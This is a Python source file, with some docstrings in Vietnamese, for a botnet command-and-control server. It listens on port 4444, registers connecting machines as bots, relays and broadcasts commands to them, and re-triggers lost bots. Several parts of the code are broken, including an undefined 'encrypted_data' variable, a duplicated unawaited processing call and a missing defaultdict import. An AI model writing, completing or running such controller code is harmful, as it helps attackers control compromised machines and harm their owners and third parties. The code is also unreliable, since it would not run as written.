from __future__ import annotations
import socket
import threading
import json
import time
import orjson
import asyncio
import aiocache
from typing import Dict, List, Optional, Any, Tuple, Set
from pathlib import Path
import logging
import statistics
from utils.crypto import Crypto
from botnet.manager import BotnetManager
from core.plugin_system import PluginManager
from concurrent.futures import ThreadPoolExecutor
import queue
import lru

class Server:
    def __init__(self, host: str = '0.0.0.0', port: int = 4444,
                 max_connections: int = 1000,
                 initial_buffer: int = 8192) -> None:
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.running = False
        self.start_time = 0.0

        # Performance settings
        self.max_connections = max_connections
        self.initial_buffer = initial_buffer
        self.buffer_stats: List[int] = []
        
        # Components
        self.crypto = Crypto()
        self.botnet = BotnetManager()
        self.plugin_manager = PluginManager()
        
        # Connection pools
        self.thread_pool = ThreadPoolExecutor(max_workers=32)
        self.connection_pools: Dict[str, queue.Queue] = {
            'read': queue.Queue(maxsize=max_connections),
            'write': queue.Queue(maxsize=max_connections)
        }
        
        # Client management
        self.clients = lru.LRU(max_connections)
        self.client_lock = threading.Lock()
        self.active_clients: Set[str] = set()
        
        # Advanced caching with TTL and stats
        self.cache = aiocache.SimpleMemoryCache(ttl=300)
        self.cache_hits = 0
        self.cache_misses = 0
        
        # Event loops
        self.loop = asyncio.new_event_loop()
        self.write_loop = asyncio.new_event_loop()
        
        # Setup logging
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        """Khởi tạo server

        Returns:
            bool: True nếu khởi tạo thành công
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            
            self.running = True
            self.start_time = time.time()
            
            # Load plugins
            self.plugin_manager.load_plugins()
            
            self.logger.info(f"Server initialized on {self.host}:{self.port}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error initializing server: {str(e)}")
            if self.sock:
                self.sock.close()
            return False
            
    def start(self) -> None:
        """Bắt đầu chấp nhận kết nối"""
        if not self.sock or not self.running:
            raise RuntimeError("Server not initialized")
            
        # Start async event loops
        threading.Thread(target=self._run_event_loop, daemon=True).start()
        threading.Thread(target=self._run_write_loop, daemon=True).start()
        
        # Start accepting connections
        accept_thread = threading.Thread(target=self._accept_connections)
        accept_thread.daemon = True
        accept_thread.start()
        
    def _run_event_loop(self):
        """Run main event loop"""
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
        
    def _run_write_loop(self):
        """Run write event loop"""
        asyncio.set_event_loop(self.write_loop)
        self.write_loop.run_forever()
        
    def stop(self) -> None:
        """Dừng server và đóng tất cả kết nối"""
        self.running = False
        
        # Close all client connections
        with self.client_lock:
            for client in self.clients.values():
                if 'socket' in client:
                    client['socket'].close()
            self.clients.clear()
            
        # Stop plugins
        self.plugin_manager.stop_all()
        
        # Close server socket
        if self.sock:
            self.sock.close()
            
        self.logger.info("Server stopped")
        
    def _accept_connections(self) -> None:
        """Thread chấp nhận kết nối mới"""
        while self.running and self.sock:
            try:
                client, address = self.sock.accept()
                # Schedule client handling in event loop
                asyncio.run_coroutine_threadsafe(
                    self._handle_client(client, address),
                    self.loop
                )
                self.logger.info(f"New connection from {address[0]}:{address[1]}")
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"Error accepting connection: {str(e)}")
                    
    async def _handle_client(self, client: socket.socket, address: Tuple[str, int]) -> None:
        """Xử lý kết nối client

        Args:
            client (socket.socket): Client socket
            address (Tuple[str, int]): Client address (host, port)
        """
        client_id = f"{address[0]}:{address[1]}"
        
        try:
            # Add to clients list
            with self.client_lock:
                self.clients[client_id] = {
                    'socket': client,
                    'address': address,
                    'connected_at': time.time()
                }
                
            # Dynamically adjust buffer size based on usage patterns
            buffer_size = self._get_optimal_buffer()
            
            while self.running:
                data = await self._receive_data(client, buffer_size)
                if not data:
                    break
                
                # Try cache first
                cache_key = hash(data)
                cached_response = await self.cache.get(cache_key)
                
                if cached_response:
                    self.cache_hits += 1
                    await self._send_data(client, cached_response)
                    continue
                    
                self.cache_misses += 1
                
                # Decrypt and process if not in cache
                data = self.crypto.decrypt(encrypted_data)
                response = self._process_client_data(client_id, data)
                
                # Process and cache response
                response = await self._process_client_data(client_id, data)
                encrypted_response = self.crypto.encrypt(orjson.dumps(response))
                
                # Cache with TTL based on command type
                ttl = self._get_cache_ttl(response)
                await self.cache.set(cache_key, encrypted_response, ttl=ttl)
                
                # Send response async
                await self._send_data(client, encrypted_response)
                
        except Exception as e:
            self.logger.error(f"Error handling client {client_id}: {str(e)}")
            
        finally:
            # Clean up client
            self._remove_client(client_id)
            
    async def _process_client_data(self, client_id: str, data: str) -> Dict[str, Any]:
        """Xử lý dữ liệu từ client

        Args:
            client_id (str): ID của client
            data (str): Dữ liệu đã giải mã

        Returns:
            Dict[str, Any]: Response gửi về client
        """
        try:
            request = json.loads(data)
            command = request.get('command')
            args = request.get('args', [])
            
            # Process commands in thread pool to avoid blocking
            if command == 'register':
                return await self.loop.run_in_executor(
                    self.thread_pool,
                    self._register_client,
                    client_id,
                    args
                )
                
            elif command == 'command':
                return await self.loop.run_in_executor(
                    self.thread_pool,
                    self._execute_command,
                    client_id,
                    args
                )
                
            elif command.startswith('plugin.'):
                plugin_name = command.split('.')[1]
                return await self.loop.run_in_executor(
                    self.thread_pool,
                    self._execute_plugin_command,
                    plugin_name,
                    args
                )
                
            else:
                return {
                    'status': 'error',
                    'message': 'Unknown command'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    def _register_client(self, client_id: str, info: Dict) -> Dict[str, Any]:
        """Đăng ký thông tin client mới

        Args:
            client_id (str): ID của client
            info (Dict): Thông tin client

        Returns:
            Dict[str, Any]: Response xác nhận
        """
        try:
            with self.client_lock:
                if client_id in self.clients:
                    self.clients[client_id].update(info)
                    
            # Add to botnet
            self.botnet.add_bot(client_id, info)
            
            return {
                'status': 'success',
                'message': 'Registered successfully'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    async def _execute_command(self, client_id: str, command: Dict) -> Dict[str, Any]:
        """Thực thi lệnh trên client với timeout và retry

        Args:
            client_id (str): ID của client
            command (Dict): Thông tin lệnh cần thực thi

        Returns:
            Dict[str, Any]: Kết quả thực thi
        """
        max_retries = 3
        timeout = 30
        retry_delay = 5

        for attempt in range(max_retries):
            try:
                # Execute with timeout
                result = await asyncio.wait_for(
                    self.loop.run_in_executor(
                        self.thread_pool,
                        self.botnet.execute_command,
                        client_id,
                        command
                    ),
                    timeout=timeout
                )

                # Update command stats
                cmd_type = command.get('type', 'unknown')
                self._update_command_stats(cmd_type, True)

                return {
                    'status': 'success',
                    'data': result,
                    'attempt': attempt + 1
                }

            except asyncio.TimeoutError:
                self.logger.warning(
                    f"Command timed out for client {client_id} (attempt {attempt + 1}/{max_retries})"
                )
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay)
                    continue
                return {
                    'status': 'error',
                    'message': 'Command timed out',
                    'attempt': attempt + 1
                }

            except Exception as e:
                self.logger.error(
                    f"Error executing command for client {client_id}: {str(e)}"
                )
                # Update command stats
                cmd_type = command.get('type', 'unknown')
                self._update_command_stats(cmd_type, False)
                
                return {
                    'status': 'error',
                    'message': str(e),
                    'attempt': attempt + 1
                }

    def _update_command_stats(self, cmd_type: str, success: bool) -> None:
        """Update command execution statistics"""
        if not hasattr(self, 'command_stats'):
            self.command_stats = defaultdict(lambda: {
                'total': 0,
                'success': 0,
                'failure': 0,
                'avg_time': 0.0
            })

        stats = self.command_stats[cmd_type]
        stats['total'] += 1
        if success:
            stats['success'] += 1
        else:
            stats['failure'] += 1

    async def _broadcast_command(self, command: Dict, targets: Optional[List[str]] = None) -> Dict[str, Any]:
        """Broadcast command to multiple clients"""
        if targets is None:
            targets = list(self.active_clients)

        results = []
        for client_id in targets:
            try:
                result = await self._execute_command(client_id, command)
                results.append({
                    'client_id': client_id,
                    'result': result
                })
            except Exception as e:
                results.append({
                    'client_id': client_id,
                    'error': str(e)
                })

        return {
            'status': 'success',
            'total': len(targets),
            'successful': len([r for r in results if r.get('result',{}).get('status') == 'success']),
            'results': results
        }
            
    def _execute_plugin_command(self, plugin_name: str, args: List) -> Dict[str, Any]:
        """Thực thi lệnh plugin

        Args:
            plugin_name (str): Tên plugin
            args (List): Tham số cho plugin

        Returns:
            Dict[str, Any]: Kết quả từ plugin
        """
        try:
            plugin = self.plugin_manager.get_plugin(plugin_name)
            if not plugin:
                raise ValueError(f"Plugin {plugin_name} not found")
                
            result = plugin.execute(*args)
            return {
                'status': 'success',
                'data': result
            }
            
        except Exception as e:
            return {
                'status': 'error', 
                'message': str(e)
            }
            
    async def _remove_client(self, client_id: str, reason: str = "disconnect") -> None:
        """Xóa client và thực hiện cleanup
        
        Args:
            client_id (str): ID của client cần xóa
            reason (str): Lý do xóa client
        """
        try:
            with self.client_lock:
                if client_id in self.clients:
                    # Log client state before removal
                    self._log_client_state(client_id, "removing", reason)
                    
                    # Save client metrics
                    metrics = self._get_client_metrics(client_id)
                    await self._store_client_history(client_id, metrics)
                    
                    # Cleanup resources
                    if 'socket' in self.clients[client_id]:
                        await self._cleanup_client_resources(
                            self.clients[client_id]['socket']
                        )
                    
                    # Remove from active clients
                    self.active_clients.discard(client_id)
                    
                    # Delete client data
                    del self.clients[client_id]
                    
            # Remove from botnet with reason
            await self.botnet.remove_bot(client_id, reason)
            
            # Trigger recovery if needed
            if reason in ["timeout", "error"]:
                self._schedule_client_recovery(client_id)
                
        except Exception as e:
            self.logger.error(f"Error removing client {client_id}: {str(e)}")

    def _log_client_state(self, client_id: str, action: str, reason: str) -> None:
        """Log client state changes"""
        client = self.clients.get(client_id, {})
        self.logger.info(
            f"Client {client_id} {action}: {reason} "
            f"[uptime: {time.time() - client.get('connected_at', 0):.1f}s, "
            f"tasks: {len(client.get('tasks', []))}, "
            f"health: {self._calculate_client_health(client_id):.1f}%]"
        )

    async def _store_client_history(self, client_id: str, metrics: Dict) -> None:
        """Store client metrics history"""
        history_key = f"client_history:{client_id}"
        
        try:
            # Add timestamp
            metrics['timestamp'] = time.time()
            
            # Store in cache with 24h TTL
            await self.cache.set(
                history_key,
                metrics,
                ttl=86400  # 24 hours
            )
        except Exception as e:
            self.logger.error(f"Error storing client history: {str(e)}")

    def _get_client_metrics(self, client_id: str) -> Dict:
        """Get comprehensive client metrics"""
        client = self.clients.get(client_id, {})
        
        # Calculate statistics
        tasks = client.get('tasks', [])
        total_tasks = len(tasks)
        completed_tasks = len([t for t in tasks if t['status'] == 'completed'])
        failed_tasks = len([t for t in tasks if t['status'] == 'failed'])
        
        # Get resource usage
        resources = client.get('resources', {})
        
        return {
            'connected_at': client.get('connected_at', 0),
            'disconnected_at': time.time(),
            'uptime': time.time() - client.get('connected_at', 0),
            'tasks_total': total_tasks,
            'tasks_completed': completed_tasks,
            'tasks_failed': failed_tasks,
            'success_rate': (completed_tasks / total_tasks * 100) if total_tasks > 0 else 0,
            'health_score': self._calculate_client_health(client_id),
            'resources': {
                'cpu': resources.get('cpu_usage', 0),
                'memory': resources.get('memory_usage', 0),
                'disk': resources.get('disk_usage', 0),
                'network': resources.get('network_usage', 0)
            },
            'capabilities': client.get('capabilities', []),
            'tags': client.get('tags', [])
        }

    def _calculate_client_health(self, client_id: str) -> float:
        """Calculate overall client health score"""
        if client_id not in self.clients:
            return 0.0
            
        client = self.clients[client_id]
        score = 100.0
        
        # Uptime score (max 20)
        uptime = time.time() - client.get('connected_at', 0)
        score += min(20, uptime / 3600)  # 1 point per hour up to 20
        
        # Task success rate (max 40)
        success_rate = self._calculate_client_success_rate(client_id)
        score += success_rate * 0.4
        
        # Resource usage penalties (max -30)
        resources = client.get('resources', {})
        if resources.get('cpu_usage', 0) > 90:
            score -= 10
        if resources.get('memory_usage', 0) > 90:
            score -= 10
        if resources.get('disk_usage', 0) > 90:
            score -= 10
            
        # Recent errors penalty (max -10)
        recent_errors = len([t for t in client.get('tasks', [])[-10:]
                           if t.get('status') == 'failed'])
        score -= recent_errors * 2
        
        return max(0, min(100, score))

    def _schedule_client_recovery(self, client_id: str) -> None:
        """Schedule recovery attempt for failed client"""
        def recovery():
            time.sleep(60)  # Wait 1 minute
            if client_id not in self.clients:
                self.botnet.trigger_recovery(client_id)
                
        threading.Thread(target=recovery, daemon=True).start()
        
    def get_uptime(self) -> float:
        """Lấy thời gian server đã chạy

        Returns:
            float: Số giây đã chạy
        """
        return time.time() - self.start_time
        
    async def _receive_data(self, client: socket.socket, buffer_size: int) -> Optional[bytes]:
        """Receive data with dynamic buffer size"""
        chunks = []
        total_size = 0
        
        try:
            while True:
                chunk = await self.loop.sock_recv(client, buffer_size)
                if not chunk:
                    break
                    
                chunks.append(chunk)
                total_size += len(chunk)
                
                if len(chunk) < buffer_size:
                    break
                    
            if total_size > 0:
                self.buffer_stats.append(total_size)
                
            return b''.join(chunks) if chunks else None
            
        except Exception as e:
            self.logger.error(f"Error receiving data: {str(e)}")
            return None
            
    async def _send_data(self, client: socket.socket, data: bytes) -> bool:
        """Send data async with rate limiting"""
        try:
            await self.loop.sock_sendall(client, data)
            return True
        except Exception as e:
            self.logger.error(f"Error sending data: {str(e)}")
            return False
            
    def _get_optimal_buffer(self) -> int:
        """Calculate optimal buffer size based on usage patterns"""
        if len(self.buffer_stats) < 100:
            return self.initial_buffer
            
        # Use statistical analysis
        median = statistics.median(self.buffer_stats[-100:])
        std_dev = statistics.stdev(self.buffer_stats[-100:])
        
        # Adjust buffer size within bounds
        optimal = int(median + std_dev)
        return max(1024, min(optimal, 65536))
        
    def _get_cache_ttl(self, response: Dict) -> int:
        """Get cache TTL based on response type"""
        if response.get('status') == 'error':
            return 60  # Cache errors briefly
            
        command = response.get('command')
        if command in ['register', 'command']:
            return 30  # Short cache for dynamic commands
        return 300  # Default 5 min cache
        
    def get_stats(self) -> Dict[str, Any]:
        """Lấy thống kê chi tiết của server

        Returns:
            Dict[str, Any]: Thông tin thống kê
        """
        cmd_success_rate = {}
        for cmd, stats in self.command_stats.items():
            if stats['total'] > 0:
                success_rate = (stats['success'] / stats['total']) * 100
                cmd_success_rate[cmd] = {
                    'success_rate': f"{success_rate:.1f}%",
                    'total': stats['total'],
                    'success': stats['success'],
                    'failure': stats['failure']
                }

        # Calculate client health scores
        client_health = {}
        for client_id in self.active_clients:
            if client_id in self.clients:
                client = self.clients[client_id]
                uptime = time.time() - client.get('connected_at', 0)
                success_rate = self._calculate_client_success_rate(client_id)
                health_score = min(100, (uptime / 3600) * 0.2 + success_rate * 0.8)
                client_health[client_id] = {
                    'health_score': f"{health_score:.1f}%",
                    'uptime': f"{uptime/3600:.1f}h",
                    'success_rate': f"{success_rate:.1f}%"
                }

        return {
            'uptime': self.get_uptime(),
            'total_clients': len(self.clients),
            'active_clients': len(self.active_clients),
            'active_plugins': len(self.plugin_manager.get_active_plugins()),
            'cache_stats': {
                'hits': self.cache_hits,
                'misses': self.cache_misses,
                'hit_rate': f"{(self.cache_hits/(self.cache_hits+self.cache_misses)*100):.1f}%" if (self.cache_hits+self.cache_misses) > 0 else "0%"
            },
            'buffer_stats': {
                'current': self._get_optimal_buffer(),
                'avg': int(sum(self.buffer_stats[-100:]) / 100) if self.buffer_stats else self.initial_buffer,
                'min': min(self.buffer_stats[-100:]) if self.buffer_stats else self.initial_buffer,
                'max': max(self.buffer_stats[-100:]) if self.buffer_stats else self.initial_buffer
            },
            'command_stats': cmd_success_rate,
            'client_health': client_health,
            'thread_pool': {
                'active': self.thread_pool._work_queue.qsize(),
                'max': self.thread_pool._max_workers
            }
        }

    def _calculate_client_success_rate(self, client_id: str) -> float:
        """Calculate client command success rate"""
        if client_id not in self.clients:
            return 0.0

        client = self.clients[client_id]
        total_commands = 0
        successful_commands = 0

        for task in client.get('tasks', []):
            if task.get('status') in ['completed', 'failed']:
                total_commands += 1
                if task.get('status') == 'completed':
                    successful_commands += 1

        return (successful_commands / total_commands * 100) if total_commands > 0 else 0.0